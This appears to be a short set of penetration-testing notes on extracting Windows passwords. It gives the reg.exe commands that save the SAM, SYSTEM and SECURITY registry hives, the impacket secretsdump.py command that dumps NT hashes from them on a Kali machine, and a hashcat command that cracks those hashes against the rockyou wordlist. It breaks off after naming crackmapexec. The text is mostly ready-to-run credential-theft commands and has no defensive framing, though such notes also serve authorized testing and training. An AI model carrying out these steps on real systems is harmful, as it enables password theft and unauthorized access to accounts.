Let's check how re can extract pasword from Windows system.

hklm\sam:- Hashes of local account
hklm\system :- Contains system bootkey which can be used to decrypt SAM database. 
hklm\security :- Contaims cached credentials for domain accounts

Step 1) We need to copy the above registry hives using below commands.
            C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save 
            C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
            C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save


Step 2) Move the files from Windows system to Kali machine 

Step 3) Lets crack the files using Impact script called "secretsdump.py". We will get the hashes of the users and then we can crack it 
        #python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

Step 4) Save the nthash to the file and run hashcat to decrypt the password. (-m 1000 :- This is for NT hash) 
        #sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt



=======================================================================================================================================================

We can use crackmapexec 
